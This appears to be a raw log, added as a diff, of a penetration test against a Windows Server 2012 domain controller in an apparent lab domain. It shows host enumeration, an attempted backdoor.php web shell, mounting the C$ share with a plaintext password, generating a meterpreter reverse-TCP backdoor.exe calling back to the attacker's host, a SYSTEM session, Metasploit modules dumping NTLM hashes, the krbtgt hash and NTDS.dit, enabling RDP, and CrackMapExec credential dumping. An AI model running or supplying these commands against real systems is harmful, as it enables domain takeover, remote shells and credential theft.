+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
+SeTimeZonePrivilege             Change the time zone                      Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+E_md4hash wrapper called.
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : WIN-8MSB2DD52P9
+   Primary Dns Suffix  . . . . . . . : xerosecurity.com
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : xerosecurity.com
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
+   Physical Address. . . . . . . . . : 00-0C-29-82-29-F9
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : fd2c:60b4:7f15:0:7494:32dd:efa1:e825(Preferred) 
+   Link-local IPv6 Address . . . . . : fe80::7494:32dd:efa1:e825%12(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.1.138(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Saturday, January 30, 2016 2:26:32 PM
+   Lease Expires . . . . . . . . . . : Tuesday, February 2, 2016 2:26:32 AM
+   Default Gateway . . . . . . . . . : 192.168.1.1
+   DHCP Server . . . . . . . . . . . : 192.168.1.1
+   DHCPv6 IAID . . . . . . . . . . . : 301993001
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-1E-3E-C6-BF-00-0C-29-82-29-F9
+   DNS Servers . . . . . . . . . . . : ::1
+                                       127.0.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter Teredo Tunneling Pseudo-Interface:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+Tunnel adapter isatap.{1D60A0B6-4065-4D98-9C38-7326AA07D13E}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+E_md4hash wrapper called.
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:42             0.0.0.0:0              LISTENING       1752
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       708
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       708
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1572
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1256
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       432
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       824
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       864
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       536
+  TCP    0.0.0.0:49159          0.0.0.0:0              LISTENING       1220
+  TCP    0.0.0.0:49164          0.0.0.0:0              LISTENING       1752
+  TCP    0.0.0.0:49165          0.0.0.0:0              LISTENING       1380
+  TCP    0.0.0.0:49168          0.0.0.0:0              LISTENING       528
+  TCP    0.0.0.0:49170          0.0.0.0:0              LISTENING       1396
+  TCP    0.0.0.0:49174          0.0.0.0:0              LISTENING       2400
+  TCP    0.0.0.0:49188          0.0.0.0:0              LISTENING       1324
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       1396
+  TCP    192.168.1.138:53       0.0.0.0:0              LISTENING       1396
+  TCP    192.168.1.138:135      192.168.1.129:3605     ESTABLISHED     708
+  TCP    192.168.1.138:139      0.0.0.0:0              LISTENING       4
+  TCP    192.168.1.138:445      192.168.1.113:43090    ESTABLISHED     4
+  TCP    192.168.1.138:445      192.168.1.113:47294    ESTABLISHED     4
+  TCP    192.168.1.138:445      192.168.1.113:47313    ESTABLISHED     4
+  TCP    192.168.1.138:49158    192.168.1.129:3606     ESTABLISHED     536
+  TCP    192.168.1.138:49158    192.168.1.129:3607     ESTABLISHED     536
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:88                [::]:0                 LISTENING       536
+  TCP    [::]:135               [::]:0                 LISTENING       708
+  TCP    [::]:389               [::]:0                 LISTENING       536
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:464               [::]:0                 LISTENING       536
+  TCP    [::]:593               [::]:0                 LISTENING       708
+  TCP    [::]:636               [::]:0                 LISTENING       536
+  TCP    [::]:3268              [::]:0                 LISTENING       536
+  TCP    [::]:3269              [::]:0                 LISTENING       536
+  TCP    [::]:3389              [::]:0                 LISTENING       1572
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:9389              [::]:0                 LISTENING       1256
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       432
+  TCP    [::]:49153             [::]:0                 LISTENING       824
+  TCP    [::]:49154             [::]:0                 LISTENING       864
+  TCP    [::]:49155             [::]:0                 LISTENING       536
+  TCP    [::]:49157             [::]:0                 LISTENING       536
+  TCP    [::]:49158             [::]:0                 LISTENING       536
+  TCP    [::]:49159             [::]:0                 LISTENING       1220
+  TCP    [::]:49164             [::]:0                 LISTENING       1752
+  TCP    [::]:49165             [::]:0                 LISTENING       1380
+  TCP    [::]:49168             [::]:0                 LISTENING       528
+  TCP    [::]:49170             [::]:0                 LISTENING       1396
+  TCP    [::]:49174             [::]:0                 LISTENING       2400
+  TCP    [::]:49188             [::]:0                 LISTENING       1324
+  TCP    [::1]:53               [::]:0                 LISTENING       1396
+  TCP    [::1]:389              [::1]:49160            ESTABLISHED     536
+  TCP    [::1]:389              [::1]:49161            ESTABLISHED     536
+  TCP    [::1]:389              [::1]:54815            ESTABLISHED     536
+  TCP    [::1]:49160            [::1]:389              ESTABLISHED     1436
+  TCP    [::1]:49161            [::1]:389              ESTABLISHED     1436
+  TCP    [::1]:54815            [::1]:389              ESTABLISHED     1396
+  TCP    [fd2c:60b4:7f15:0:7494:32dd:efa1:e825]:53  [::]:0                 LISTENING       1396
+  TCP    [fe80::7494:32dd:efa1:e825%12]:53  [::]:0                 LISTENING       1396
+  TCP    [fe80::7494:32dd:efa1:e825%12]:389  [fe80::7494:32dd:efa1:e825%12]:54816  ESTABLISHED     536
+  TCP    [fe80::7494:32dd:efa1:e825%12]:389  [fe80::7494:32dd:efa1:e825%12]:54820  ESTABLISHED     536
+  TCP    [fe80::7494:32dd:efa1:e825%12]:49155  [fe80::7494:32dd:efa1:e825%12]:49196  ESTABLISHED     536
+  TCP    [fe80::7494:32dd:efa1:e825%12]:49155  [fe80::7494:32dd:efa1:e825%12]:49265  ESTABLISHED     536
+  TCP    [fe80::7494:32dd:efa1:e825%12]:49196  [fe80::7494:32dd:efa1:e825%12]:49155  ESTABLISHED     1324
+  TCP    [fe80::7494:32dd:efa1:e825%12]:49265  [fe80::7494:32dd:efa1:e825%12]:49155  ESTABLISHED     536
+  TCP    [fe80::7494:32dd:efa1:e825%12]:54816  [fe80::7494:32dd:efa1:e825%12]:389  ESTABLISHED     1324
+  TCP    [fe80::7494:32dd:efa1:e825%12]:54820  [fe80::7494:32dd:efa1:e825%12]:389  ESTABLISHED     1324
+  UDP    [fd2c:60b4:7f15:0:7494:32dd:efa1:e825]:53  *:*                                    1396
+  UDP    [fd2c:60b4:7f15:0:7494:32dd:efa1:e825]:88  *:*                                    536
+  UDP    [fd2c:60b4:7f15:0:7494:32dd:efa1:e825]:464  *:*                                    536
+  UDP    [fe80::7494:32dd:efa1:e825%12]:53  *:*                                    1396
+  UDP    [fe80::7494:32dd:efa1:e825%12]:88  *:*                                    536
+  UDP    [fe80::7494:32dd:efa1:e825%12]:464  *:*                                    536
+E_md4hash wrapper called.
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          1
+Maximum password age (days):                          42
+Minimum password length:                              7
+Length of password history maintained:                24
+Lockout threshold:                                    Never
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        PRIMARY
+The command completed successfully.
+
+E_md4hash wrapper called.
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+hacker
+The command completed successfully.
+
+E_md4hash wrapper called.
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+Desktop      C:\Users\Administrator\Desktop  
+NETLOGON     C:\Windows\SYSVOL\sysvol\xerosecurity.com\SCRIPTS
+                                             Logon server share                
+SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share                
+The command completed successfully.
+
+E_md4hash wrapper called.
+
+Source        Description      HotFixID      InstalledBy          InstalledOn  
+------        -----------      --------      -----------          -----------  
+WIN-8MSB2D... Security Update  KB2862152     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Security Update  KB2868626     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Security Update  KB2876331     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2883200     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2884101     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2884846     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2887595     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Security Update  KB2888505     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2894029     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2894179     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2898514     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Security Update  KB2900986     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2901101     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2906956     XEROSECURITY\Admi... 11/14/2013...
+WIN-8MSB2D... Update           KB2908174     XEROSECURITY\Admi... 11/14/2013...
+
+
+E_md4hash wrapper called.
+The account already exists.
+
+More help is available by typing NET HELPMSG 2224.
+
+E_md4hash wrapper called.
+System error 1378 has occurred.
+
+The specified account name is already a member of the group.
+
+E_md4hash wrapper called.
+The syntax of this command is:
+
+NET GROUP
+[groupname [/COMMENT:"text"]] [/DOMAIN]
+             groupname {/ADD [/COMMENT:"text"] | /DELETE}  [/DOMAIN]
+             groupname username [...] {/ADD | /DELETE} [/DOMAIN]
+
+E_md4hash wrapper called.
+Error: error Creating process(echo ^ > C:\inetpub\wwwroot\backdoor.php) 2
+E_md4hash wrapper called.
+ERROR: Invalid key name.
+Type "REG ADD /?" for usage.
+E_md4hash wrapper called.
+
+IMPORTANT: Command executed successfully.
+However, "netsh firewall" is deprecated;
+use "netsh advfirewall firewall" instead.
+For more information on using "netsh advfirewall firewall" commands
+instead of "netsh firewall", see KB article 947709
+at http://go.microsoft.com/fwlink/?linkid=121488 .
+
+Ok.
+MOUNTING SHARES
+root@kali:/mnt/# mkdir win2012
+root@kali:/mnt/# mount -t cifs -o username=Administrator,password=Password123$ //192.168.1.138/C$ /mnt/win2012/
+
+METERPRETER SHELL
+root@kali:/mnt/win2012# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=4444 -f exe --platform windows > backdoor.exe
+
+No Arch selected, selecting Arch: x86_64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+
+root@kali:/mnt/win2012# ls -lh
+
+total 933M
+-rwxr-xr-x 1 root root 7.0K Jan 31 19:10 backdoor.exe
+drwxr-xr-x 2 root root    0 Jul  4  2015 Boot
+-r-xr-xr-x 1 root root 390K Nov 14  2013 bootmgr
+-rwxr-xr-x 1 root root    1 Jun 18  2013 BOOTNXT
+-r-xr-xr-x 1 root root 8.0K Jul  4  2015 BOOTSECT.BAK
+drwxr-xr-x 2 root root    0 Aug 22  2013 Documents and Settings
+drwxr-xr-x 2 root root    0 Jul  4  2015 inetpub
+-rwxr-xr-x 1 root root 932M Jan 31 14:58 pagefile.sys
+-rwxr-xr-x 1 root root 7.0K Jan 31 18:51 payload.exe
+drwxr-xr-x 2 root root    0 Aug 22  2013 PerfLogs
+drwxr-xr-x 2 root root    0 Jul  4  2015 ProgramData
+dr-xr-xr-x 2 root root    0 Jul  4  2015 Program Files
+drwxr-xr-x 2 root root    0 Aug 22  2013 Program Files (x86)
+drwxr-xr-x 2 root root    0 Jul  4  2015 Recovery
+drwxr-xr-x 2 root root    0 Nov 14  2013 $Recycle.Bin
+drwxr-xr-x 2 root root    0 Jan 31 14:17 System Volume Information
+dr-xr-xr-x 2 root root    0 Jul  4  2015 Users
+drwxr-xr-x 2 root root    0 Jul  5  2015 Windows
+
+msf exploit(handler) > show options
+
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.113    yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+
+msf exploit(handler) > exploit -j
+
+[*] Exploit running as background job.
+
+[*] Started reverse TCP handler on 192.168.1.113:4444 
+msf exploit(handler) > [*] Starting the payload handler...
+
+msf exploit(handler) > 
+[*] Sending stage (1188911 bytes) to 192.168.1.138
+[*] Meterpreter session 1 opened (192.168.1.113:4444 -> 192.168.1.138:53378) at 2016-01-31 19:11:58 -0500
+
+msf exploit(handler) > sessions -l
+
+
+Active sessions
+===============
+
+  Id  Type                   Information                            Connection
+  --  ----                   -----------                            ----------
+  1   meterpreter x64/win64  NT AUTHORITY\SYSTEM @ WIN-8MSB2DD52P9  192.168.1.113:4444 -> 192.168.1.138:53378 (192.168.1.138)
+
+msf exploit(handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > 
+POST EXPLOITATION
+metasploit-windows-post.rc
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/enum_ad_computers
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+
+Domain Computers
+================
+
+ dNSHostName                       distinguishedName                                                description  operatingSystem                    operatingSystemServicePack
+ -----------                       -----------------                                                -----------  ---------------                    --------------------------
+ WIN-8MSB2DD52P9.xerosecurity.com  CN=WIN-8MSB2DD52P9,OU=Domain Controllers,DC=xerosecurity,DC=com               Windows Server 2012 R2 Datacenter  
+
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/smart_hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Running module against WIN-8MSB2DD52P9
+[*] Hashes will be saved to the database if one is connected.
+[*] Hashes will be saved in loot in JtR password file format to:
+[*] /root/.msf5/loot/20160131194836_default_192.168.1.138_windows.hashes_919916.txt
+[+] 	This host is a Domain Controller!
+[*] Dumping password hashes...
+[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+[+] 	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b77d7cda13b836d669bea8ebbdb6464
+[+] 	user:1106:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+[+] 	test3:1603:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+[+] 	hacker:1604:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+[+] 	user-XP$:1104:aad3b435b51404eeaad3b435b51404ee:9874f93eb39548c31e655bc688c89064
+[+] 	TEST-3F6416AC49$:1602:aad3b435b51404eeaad3b435b51404ee:a93c420761d5d783f1c3c674482e7d47
+[*] Post module execution completed
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/cachedump
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Executing module against WIN-8MSB2DD52P9
+[*] Cached Credentials Setting: 10 - (Max is 50 and 0 disables, and 10 is default)
+[*] Obtaining boot key...
+[*] Obtaining Lsa key...
+[*] Vista or above system
+[*] Obtaining LK$KM...
+[*] Dumping cached credentials...
+[*] Hash are in MSCACHE_VISTA format. (mscash2)
+[*] MSCACHE v2 saved in: /root/.msf5/loot/20160131194854_default_192.168.1.138_mscache2.creds_222028.txt
+[*] John the Ripper format:
+# mscash2
+
+[*] Post module execution completed
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/enum_computers
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Running module against WIN-8MSB2DD52P9
+
+List of Domain Hosts for the primary Domain.
+============================================
+
+ Domain        Hostname         IPs
+ ------        --------         ---
+ XEROSECURITY  TEST-3F6416AC49  192.168.1.129
+ XEROSECURITY  WIN-8MSB2DD52P9  192.168.1.138
+
+
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/credentials/credential_collector
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Running module against WIN-8MSB2DD52P9
+[+] Collecting hashes...
+    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: krbtgt:aad3b435b51404eeaad3b435b51404ee:2b77d7cda13b836d669bea8ebbdb6464
+    Extracted: user:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+    Extracted: test3:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+    Extracted: hacker:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665
+    Extracted: WIN-8MSB2DD52P9$:aad3b435b51404eeaad3b435b51404ee:58171b080def3d75833dcc4588956059
+    Extracted: user-XP$:aad3b435b51404eeaad3b435b51404ee:9874f93eb39548c31e655bc688c89064
+    Extracted: TEST-3F6416AC49$:aad3b435b51404eeaad3b435b51404ee:a93c420761d5d783f1c3c674482e7d47
+[+] Collecting tokens...
+    IIS APPPOOL\DefaultAppPool
+    NT AUTHORITY\IUSR
+    NT AUTHORITY\LOCAL SERVICE
+    NT AUTHORITY\NETWORK SERVICE
+    NT AUTHORITY\SYSTEM
+    Window Manager\DWM-2
+    XEROSECURITY\Administrator
+    NT AUTHORITY\ANONYMOUS LOGON
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/enum_domain
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[+] FOUND Domain: xerosecurity
+[+] FOUND Domain Controller: WIN-8MSB2DD52P9 (IP: 192.168.1.138)
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/manage/enable_rdp
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Enabling Remote Desktop
+[*] 	RDP is disabled; enabling it ...
+[*] Setting Terminal Services service startup mode
+[*] 	The Terminal Services service is not set to auto, changing it to auto ...
+[*] 	Opening port in local firewall if necessary
+[*] For cleanup execute Meterpreter resource file: /root/.msf5/loot/20160131195101_default_192.168.1.138_host.windows.cle_069757.txt
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/credentials/domain_hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Volume Shadow Copy service not running. Starting it now...
+[+] Volume Shadow Copy started successfully.
+[*] Software Shadow Copy service not running. Starting it now...
+[+] Software Shadow Copy started successfully.
+[*] NTDS database copied to C:\Windows\Temp\XjxLdwoibp\Active Directory\ntds.dit
+[*] Repairing NTDS database after copy...
+[*] 
+Initiating REPAIR mode...
+        Database: C:\Windows\Temp\XjxLdwoibp\Active Directory\ntds.dit
+  Temp. Database: TEMPREPAIR160.EDB
+
+Checking database integrity.
+
+                     Scanning Status (% complete)
+
+          0    10   20   30   40   50   60   70   80   90  100
+          |----|----|----|----|----|----|----|----|----|----|
+          ...................................................
+
+
+Integrity check successful.
+
+Note:
+  It is recommended that you immediately perform a full backup
+  of this database. If you restore a backup made before the
+  repair, the database will be rolled back to the state
+  it was in at the time of that backup.
+
+Operation completed successfully in 0.578 seconds.
+
+[+]           Administrator (Built-in account for administering the computer/domain)
+          Administrator:500:aad3b435b51404eeaad3b435b51404ee:B490B475E987909AE9BD83A65AA94665
+          Password Expires: ay, January 1, 1601
+          Last Password Change: 7:31:09 PM Saturday, January 30, 2016
+          Last Logon: 12:42:59 AM Monday, February 1, 2016
+          Logon Count: 54
+          
+          Hash History:
+          Administrator:500:FA3FB68C6EDB18CB7583C80994C8C089:B490B475E987909AE9BD83A65AA94665
+Administrator:500:BCD82078CE35C7829DE997CC8916E980:D47A1AAB4276F8B2C8260D6080CB4A6A
+Administrator:500:1D1D058C94FD4ACFFA49846759673AEE:B490B475E987909AE9BD83A65AA94665
+
+
+[+]          Guest (Built-in account for guest access to the computer/domain)
+         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+         Password Expires: Never
+         Last Password Change: 12:00:00 AM Monday, January 1, 1601
+         Last Logon: 12:00:00 AM Monday, January 1, 1601
+         Logon Count: 0
+          - Account Disabled
+- Password Never Expires
+- No Password Required
+
+         Hash History:
+         
+
+[+] krbtgt (Key Distribution Center Service Account)
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2B77D7CDA13B836D669BEA8EBBDB6464
+Password Expires: r
+Last Password Change: 11:30:36 AM Saturday, July 4, 2015
+Last Logon: 12:00:00 AM Monday, January 1, 1601
+Logon Count: 0
+ - Account Disabled
+
+Hash History:
+krbtgt:502:A2767649B8542D1D63AA332E6D42A321:2B77D7CDA13B836D669BEA8EBBDB6464
+
+
+[+]           user ()
+          user:1106:aad3b435b51404eeaad3b435b51404ee:B490B475E987909AE9BD83A65AA94665
+          Password Expires: r
+          Last Password Change: 7:31:37 PM Saturday, January 30, 2016
+          Last Logon: 11:09:32 PM Saturday, January 30, 2016
+          Logon Count: 5
+           - Password Never Expires
+
+          Hash History:
+          user:1106:CA57574CC11A255FD2EBD16BFCD3B45F:B490B475E987909AE9BD83A65AA94665
+user:1106:C3E26BFE0F884EDBCA0FDE2816978F2B:B490B475E987909AE9BD83A65AA94665
+
+
+[+] test3 ()
+test3:1603:aad3b435b51404eeaad3b435b51404ee:B490B475E987909AE9BD83A65AA94665
+Password Expires: ay, January 1, 1601
+Last Password Change: 7:16:30 PM Sunday, January 31, 2016
+Last Logon: 12:00:00 AM Monday, January 1, 1601
+Logon Count: 0
+
+Hash History:
+test3:1603:7D03E2B0385244D8FA5FD08D4CBCD034:B490B475E987909AE9BD83A65AA94665
+
+
+[+] hacker ()
+hacker:1604:aad3b435b51404eeaad3b435b51404ee:B490B475E987909AE9BD83A65AA94665
+Password Expires: ay, January 1, 1601
+Last Password Change: 8:40:50 PM Sunday, January 31, 2016
+Last Logon: 12:00:00 AM Monday, January 1, 1601
+Logon Count: 0
+
+Hash History:
+hacker:1604:D14E9C2FA1F1498C5CD4B1C2F6851AEE:B490B475E987909AE9BD83A65AA94665
+
+
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/enum_patches
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[+] KB2871997 is missing
+[+] KB2928120 is missing
+[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
+[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
+[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
+[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
+[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
+[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
+[*] Post module execution completed
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/manage/nbd_server
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[-] Post failed: Msf::OptionValidateError The following options failed to validate: DEVICE.
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/credentials/idm
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Looking at Key S-1-5-21-1088676282-494858925-2056655024-500
+[*] IDM not installed for this user.
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> use post/windows/gather/enum_shares
+resource (/pentest/windows/metasploit-windows-post-exploitation.rc)> run
+[*] Running against session 3
+[*] The following shares were found:
+[*] 	Name: SYSVOL
+[*] 	Path: C:\Windows\SYSVOL\sysvol
+[*] 	Type: 0
+[*] 
+[*] 	Name: NETLOGON
+[*] 	Path: C:\Windows\SYSVOL\sysvol\xerosecurity.com\SCRIPTS
+[*] 	Type: 0
+[*] 
+[*] 	Name: Desktop
+[*] 	Path: C:\Users\Administrator\Desktop
+[*] 	Type: 0
+[*] 
+[*] Post module execution completed
+
+
+resource (/pentest/windows/metasploit-windows-post-exploitation2.rc)> use post/windows/gather/hashdump
+resource (/pentest/windows/metasploit-windows-post-exploitation2.rc)> run
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 3d33c6ea71133396933c08a0326e1da9...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+No users with password hints on this system
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b490b475e987909ae9bd83a65aa94665:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+CRACKMAPEXEC
+root@kali:/pentest/windows/CrackMapExec# python /pentest/windows/CrackMapExec/crackmapexec.py -u Administrator 
+-p Password123$ -d XEROSECURITY 192.168.1.129 --sam --lsa --ntds vss --shares --check-uac --sessions --disks --users --lusers
+ 
+02-01-2016 15:35:12 [*] 192.168.1.129:445 is running Windows 5.1 (name:TEST-3F6416AC49) (domain:XEROSECURITY)
+02-01-2016 15:35:12 [+] 192.168.1.129:445 Login successful XEROSECURITY\Administrator:Password123$
+02-01-2016 15:35:12 [+] 192.168.1.129:445 Available shares:
+02-01-2016 15:35:12           SHARE     Permissions
+02-01-2016 15:35:12           -----     -----------
+02-01-2016 15:35:12               C     READ, WRITE
+02-01-2016 15:35:12              C$     READ, WRITE
+02-01-2016 15:35:12       Downloads     READ, WRITE
+02-01-2016 15:35:12            IPC$       NO ACCESS
+02-01-2016 15:35:12          ADMIN$     READ, WRITE
+02-01-2016 15:35:12 [+] 192.168.1.129:445 Dumping users:
+02-01-2016 15:35:12 Administrator (500)/FullName: 
+02-01-2016 15:35:12 Administrator (500)/UserComment: 
